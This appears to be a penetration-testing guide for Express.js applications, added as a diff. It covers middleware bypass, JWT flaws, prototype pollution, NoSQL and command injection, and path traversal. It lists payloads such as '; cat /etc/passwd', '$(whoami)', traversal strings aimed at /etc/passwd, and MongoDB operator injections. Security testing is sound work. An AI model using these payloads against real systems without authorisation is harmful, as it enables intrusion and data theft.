@@ -1,0 +1,519 @@
+<express_security_guide>
+<title>EXPRESS.JS SECURITY TESTING</title>
+
+<critical>Express.js is the most popular Node.js web framework. Its minimalist design means security features are opt-in rather than default. Testing must focus on middleware bypass, input validation gaps, session management, prototype pollution, and common Node.js vulnerabilities.</critical>
+
+<scope>
+- Middleware bypass and ordering issues
+- Input validation and sanitization
+- Route parameter pollution
+- Session and authentication security
+- Error handling and information disclosure
+- Body parser vulnerabilities
+- Trust proxy misconfigurations
+- Path traversal and file serving
+</scope>
+
+<methodology>
+1. Identify Express version and installed middleware through fingerprinting.
+2. Map routes and test middleware ordering for bypass opportunities.
+3. Probe input handling for injection and type coercion vulnerabilities.
+4. Test authentication and session mechanisms.
+5. Examine error handling for information disclosure.
+</methodology>
+
+<fingerprinting>
+<version_detection>
+{% raw %}
+# Express version indicators:
+# - X-Powered-By: Express (if not disabled)
+# - Error page format
+# - Default 404 page: "Cannot GET /path"
+
+# Check headers
+curl -I https://target.com/
+
+# X-Powered-By: Express
+# ETag format (varies by version)
+
+# Common middleware indicators:
+# - helmet (security headers present)
+# - cors (CORS headers)
+# - compression (Content-Encoding: gzip)
+
+# Error message format
+GET /nonexistent_path_12345
+# "Cannot GET /nonexistent_path_12345"
+{% endraw %}
+</version_detection>
+
+<route_enumeration>
+{% raw %}
+# Common Express routes:
+/api/
+/api/v1/
+/auth/
+/login
+/logout
+/register
+/users
+/admin
+/health
+/status
+/docs
+/swagger
+/graphql
+
+# REST patterns:
+/api/users
+/api/users/:id
+/api/users/:id/posts
+{% endraw %}
+</route_enumeration>
+</fingerprinting>
+
+<middleware_attacks>
+<middleware_bypass>
+{% raw %}
+# Middleware ordering vulnerabilities
+
+# If auth middleware comes after route handler:
+app.get('/admin', adminHandler);  // No auth!
+app.use(authMiddleware);  // Too late
+
+# Route-specific middleware bypass
+app.use('/api', rateLimiter);
+// Attack via /API (case sensitivity)
+// Attack via /api/ (trailing slash)
+// Attack via /api// (double slash)
+
+# Path normalization differences:
+GET /api/../admin  # May bypass /api middleware
+GET /api%2f..%2fadmin
+GET /admin/..%2fapi/secret
+{% endraw %}
+</middleware_bypass>
+
+<authentication_bypass>
+{% raw %}
+# JWT middleware bypass
+
+# Missing Authorization header handling
+GET /protected HTTP/1.1
+# No Authorization header - does it fail open?
+
+# Invalid token handling
+Authorization: Bearer invalid
+Authorization: Bearer null
+Authorization: Bearer undefined
+Authorization: 
+
+# Algorithm confusion (if using jsonwebtoken)
+# Change RS256 to HS256
+
+# Token in different locations
+?token=xxx
+Cookie: token=xxx
+X-Access-Token: xxx
+{% endraw %}
+</authentication_bypass>
+
+<cors_misconfiguration>
+{% raw %}
+# CORS middleware testing
+
+# Origin reflection
+Origin: https://evil.com
+# Check Access-Control-Allow-Origin response
+
+# Null origin
+Origin: null
+
+# Subdomain bypass
+Origin: https://evil.target.com
+
+# Credentials with wild origin
+# Access-Control-Allow-Credentials: true
+# with Access-Control-Allow-Origin: *  (browser blocks, but backend issue)
+{% endraw %}
+</cors_misconfiguration>
+</middleware_attacks>
+
+<input_handling>
+<parameter_pollution>
+{% raw %}
+# HTTP Parameter Pollution
+
+# Express with qs parser:
+?id=1&id=2
+# req.query.id = ['1', '2']
+
+# Bypass filters:
+?role=user&role=admin
+# If code checks role[0] or first value
+
+# Array injection:
+?id[]=1&id[]=2
+?id[0]=1&id[1]=2
+
+# Object injection (if using extended: true):
+?config[admin]=true
+?user[isAdmin]=true
+?settings[debug]=true
+{% endraw %}
+</parameter_pollution>
+
+<type_coercion>
+{% raw %}
+# Type confusion attacks
+
+# String expected, array received:
+?search=test        # Normal
+?search[]=test      # Array - may cause errors or bypass
+
+# Object injection:
+?filter={"admin": true}
+?filter[admin]=true
+
+# Boolean confusion:
+?active=true
+?active=1
+?active=yes
+
+# Numeric injection:
+?id=1
+?id=1e9999  # Very large number
+?id=NaN
+?id=Infinity
+{% endraw %}
+</type_coercion>
+
+<body_parser_vulnerabilities>
+{% raw %}
+# Body parser attacks
+
+# JSON with prototype pollution:
+{
+  "__proto__": {"admin": true},
+  "constructor": {"prototype": {"admin": true}}
+}
+
+# Large payload DoS:
+# Send very large JSON body
+# Check if limit is enforced
+
+# Content-Type confusion:
+Content-Type: application/json
+{"key": "value"}
+
+Content-Type: application/x-www-form-urlencoded
+key=value
+
+# Check which parser handles the request
+
+# Multipart/form-data injection:
+# File upload with path traversal
+{% endraw %}
+</body_parser_vulnerabilities>
+</input_handling>
+
+<route_vulnerabilities>
+<route_parameter_injection>
+{% raw %}
+# Route parameter attacks
+
+# Path traversal in params:
+app.get('/files/:filename', ...)
+GET /files/..%2f..%2f..%2fetc/passwd
+GET /files/....//....//etc/passwd
+
+# Regex bypass:
+app.get('/users/:id(\\d+)', ...)
+# Only numeric IDs, but test encoding:
+GET /users/1%00abc
+
+# Optional parameters:
+app.get('/users/:id?', ...)
+GET /users/        # Empty ID handling
+
+# Multiple params:
+app.get('/users/:userId/posts/:postId', ...)
+GET /users/victim_id/posts/any_post
+{% endraw %}
+</route_parameter_injection>
+
+<method_override>
+{% raw %}
+# HTTP method override (if method-override middleware used)
+
+POST /api/users/1 HTTP/1.1
+X-HTTP-Method-Override: DELETE
+
+# Or query parameter:
+POST /api/users/1?_method=DELETE
+
+# Or header variations:
+X-HTTP-Method: DELETE
+X-Method-Override: DELETE
+{% endraw %}
+</method_override>
+</route_vulnerabilities>
+
+<session_attacks>
+<session_management>
+{% raw %}
+# Session vulnerabilities
+
+# Session fixation:
+# Can session ID be set before login?
+
+# Cookie settings:
+# Check express-session configuration:
+# - secure: true (HTTPS only)
+# - httpOnly: true
+# - sameSite: 'strict'
+
+# Session secret weakness:
+# If secret is weak/default, session can be forged
+
+# Session storage:
+# Memory store - session loss on restart
+# Check for session data exposure in Redis/MongoDB
+{% endraw %}
+</session_management>
+
+<jwt_vulnerabilities>
+{% raw %}
+# JWT implementation issues
+
+# Algorithm none:
+{"alg": "none", "typ": "JWT"}
+
+# Algorithm confusion:
+# RS256 to HS256
+{"alg": "HS256", "typ": "JWT"}
+# Sign with public key as secret
+
+# Secret brute force:
+# Common weak secrets:
+# - secret
+# - password
+# - your-256-bit-secret
+
+# Token manipulation:
+# Modify payload without re-signing
+# Test if signature is verified
+{% endraw %}
+</jwt_vulnerabilities>
+
+<passport_attacks>
+{% raw %}
+# Passport.js authentication bypass
+
+# Deserialize user bypass:
+# If deserializeUser doesn't validate user exists
+
+# Strategy-specific attacks:
+# Local: username enumeration
+# OAuth: redirect_uri manipulation
+# JWT: token validation bypass
+
+# Session serialization:
+# User ID in session - test for IDOR
+passport.serializeUser((user, done) => done(null, user.id));
+{% endraw %}
+</passport_attacks>
+</session_attacks>
+
+<error_handling>
+<information_disclosure>
+{% raw %}
+# Error information leakage
+
+# Stack traces in production
+# Send malformed requests:
+POST /api/users HTTP/1.1
+Content-Type: application/json
+
+{"malformed json
+
+# Internal paths revealed in errors:
+# /home/user/app/node_modules/...
+# /var/www/app/src/...
+
+# Database errors:
+# MongoDB ObjectId errors
+# SQL syntax errors
+{% endraw %}
+</information_disclosure>
+
+<error_based_injection>
+{% raw %}
+# Trigger errors for information:
+
+# Type errors:
+?id={}
+?id=[]
+?id=function(){}
+
+# Syntax errors in query:
+?filter={"$where": "sleep(5000)"}
+
+# Path errors:
+GET /api/../../../etc/passwd
+{% endraw %}
+</error_based_injection>
+</error_handling>
+
+<injection_attacks>
+<nosql_injection>
+{% raw %}
+# MongoDB injection (most common with Express)
+
+# Operator injection:
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+
+# Query parameter injection:
+?username[$ne]=&password[$ne]=
+?username[$regex]=admin&password[$ne]=
+
+# $where injection:
+{"$where": "sleep(5000)"}
+{"$where": "this.password.match(/^a/)"}
+{% endraw %}
+</nosql_injection>
+
+<command_injection>
+{% raw %}
+# Command injection via child_process
+
+# If user input reaches exec/spawn:
+; ls -la
+| cat /etc/passwd
+`id`
+$(whoami)
+
+# Common vulnerable patterns:
+exec('convert ' + filename + ' output.png')
+spawn('ffmpeg', ['-i', userInput])
+{% endraw %}
+</command_injection>
+
+<path_traversal>
+{% raw %}
+# File serving vulnerabilities
+
+# express.static with symlinks:
+# Symlink following in static directory
+
+# sendFile with user input:
+res.sendFile(req.params.file)
+# Attack: /../../../etc/passwd
+
+# Path traversal payloads:
+../../../etc/passwd
+..%2f..%2f..%2fetc/passwd
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc/passwd
+{% endraw %}
+</path_traversal>
+</injection_attacks>
+
+<trust_proxy>
+<proxy_trust_issues>
+{% raw %}
+# trust proxy misconfiguration
+
+# If app.set('trust proxy', true):
+# X-Forwarded-For is trusted
+
+# IP spoofing:
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: admin-internal-ip
+
+# Bypass IP-based access control:
+X-Forwarded-For: allowed-ip
+
+# Protocol confusion:
+X-Forwarded-Proto: https
+# May bypass HTTPS-only checks
+
+# Host header injection:
+X-Forwarded-Host: evil.com
+{% endraw %}
+</proxy_trust_issues>
+</trust_proxy>
+
+<common_payloads>
+{% raw %}
+# NoSQL injection
+{"username": {"$ne": ""}}
+{"$where": "1==1"}
+?param[$ne]=
+
+# Prototype pollution
+{"__proto__": {"admin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+
+# Parameter pollution
+?param=value1&param=value2
+?param[]=value1&param[]=value2
+
+# Path traversal
+../../../etc/passwd
+..%2f..%2f..%2fetc/passwd
+
+# JWT algorithm confusion
+{"alg": "none"}
+{"alg": "HS256"}
+
+# Command injection
+; cat /etc/passwd
+| id
+$(whoami)
+`id`
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate middleware bypass via path manipulation.
+2. Show NoSQL injection in MongoDB queries.
+3. Prove prototype pollution via JSON body.
+4. Document session or JWT vulnerabilities.
+5. Provide reproducible requests with exact headers and body.
+</validation>
+
+<false_positives>
+- Proper middleware ordering with authentication first
+- Parameterized queries for all database operations
+- Input validation and sanitization on all endpoints
+- Secure session configuration with strong secret
+- Error handling without stack traces in production
+</false_positives>
+
+<impact>
+- Authentication bypass via middleware ordering
+- Data breach via NoSQL injection
+- Remote code execution via prototype pollution chains
+- Session hijacking through insecure cookies
+- Information disclosure via verbose errors
+- Server compromise via command injection
+</impact>
+
+<pro_tips>
+1. Check X-Powered-By header for Express detection.
+2. Test middleware bypass with path variations (case, slashes).
+3. Look for query parameter array injection with qs parser.
+4. Check if body parser has limits configured.
+5. Test JWT implementations for algorithm confusion.
+6. Look for trust proxy misconfigurations behind load balancers.
+7. Test session secret strength if cookie can be decoded.
+8. Check error handling in development vs production.
+9. Test route parameters for path traversal.
+10. Look for child_process usage with user input.
+</pro_tips>
+
+<remember>Express provides minimal defaults, leaving security as the developer's responsibility. Middleware ordering is critical - auth must come before routes. Input validation must be explicit since Express doesn't validate by default. Always check for NoSQL injection when MongoDB is used, and prototype pollution in any JSON handling.</remember>
+</express_security_guide>
